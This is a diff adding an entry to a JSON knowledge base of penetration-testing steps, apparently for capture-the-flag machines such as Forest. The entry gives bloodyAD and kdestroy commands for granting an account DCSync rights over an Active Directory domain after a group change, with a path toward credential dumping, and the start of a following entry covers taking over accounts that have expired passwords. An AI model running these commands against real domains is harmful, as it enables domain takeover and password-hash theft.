@@ -2342,6 +2342,58 @@
       ]
     },
     {
+      "id": "fix-acl-reauth",
+      "title": "ACL Write Denied: Re-Authenticate After the Grant",
+      "hypothesis": "insufficientAccessRights / ERROR_ACCESS_DENIED on a bloodyAD write (add dcsync, set owner, add groupMember) right after you added yourself to the group that confers the right is the classic AD wall: the right is real, but your CURRENT session's token was issued BEFORE the membership change, so the DC does not see it yet. Re-authenticate so a fresh token carries the new group, then the exact same write succeeds. This strands people one step from Domain Admin on boxes like Forest.",
+      "tool": "bloodyad",
+      "tools": [
+        "bloodyad",
+        "kdestroy"
+      ],
+      "os": [
+        "windows"
+      ],
+      "requires_all": [
+        "blocker.acl_reauth"
+      ],
+      "produces": [
+        "advice.reauth"
+      ],
+      "priority": 88,
+      "sequence": true,
+      "proves": "the ACL write (DCSync grant / owner change) lands once you re-authenticate with the new membership",
+      "does_not_prove": "a new right, it makes the right you just granted yourself actually take effect in your session",
+      "report": {
+        "finding": "ACL write re-authentication resolved",
+        "severity": "info"
+      },
+      "refs": [
+        "https://www.thehacker.recipes/ad/movement/access-controls"
+      ],
+      "commands": [
+        {
+          "tool": "bloodyad",
+          "run": "bloodyAD -d {{domain}} --host {{target}} -u {{user}} -p '{{password}}' get object \"{{user}}\" --attr memberOf",
+          "note": "First confirm the add actually stuck: this should list the group you just joined (e.g. Exchange Windows Permissions). If it does NOT, the add silently failed, re-run it. If it DOES, your current session token simply predates it, go to the next step."
+        },
+        {
+          "tool": "kdestroy",
+          "run": "kdestroy -A 2>/dev/null; unset KRB5CCNAME",
+          "note": "Clear any cached Kerberos ticket. A TGT from an earlier kinit / getTGT carries your group memberships from BEFORE the add, and bloodyAD will happily reuse it, so the DC keeps seeing the old groups. Clearing it forces the next command to authenticate fresh."
+        },
+        {
+          "tool": "bloodyad",
+          "run": "bloodyAD -d {{domain}} --host {{target}} -u {{user}} -p '{{password}}' add dcsync {{user}}",
+          "note": "Retry the grant. With a fresh authentication (no stale ticket) your new membership is in the token, so your WriteDACL over the domain object is honored and the two DS-Replication ACEs are written. Then run the `dcsync` / secretsdump card."
+        },
+        {
+          "tool": "bloodyad",
+          "run": "sleep 30; bloodyAD -d {{domain}} --host {{target}} -u {{user}} -p '{{password}}' add dcsync {{user}}",
+          "note": "Still denied? The token/replication can lag a few seconds on a busy DC, wait and retry. If you authenticate over Kerberos (-k) rather than a password, get a FRESH TGT after the group add (kinit / getTGT.py), the old TGT will never carry the new group SID no matter how many times you retry."
+        }
+      ]
+    },
+    {
       "id": "account-password-change",
       "title": "Change an Expired Password to Use It",
       "hypothesis": "STATUS_PASSWORD_MUST_CHANGE means the credential is VALID - the account simply must set a new password on first use. Change it remotely (no shell needed) and the account is yours. Lab authors plant this on freshly-created or reset accounts to stall you; it is a one-command fix, not a dead end.",
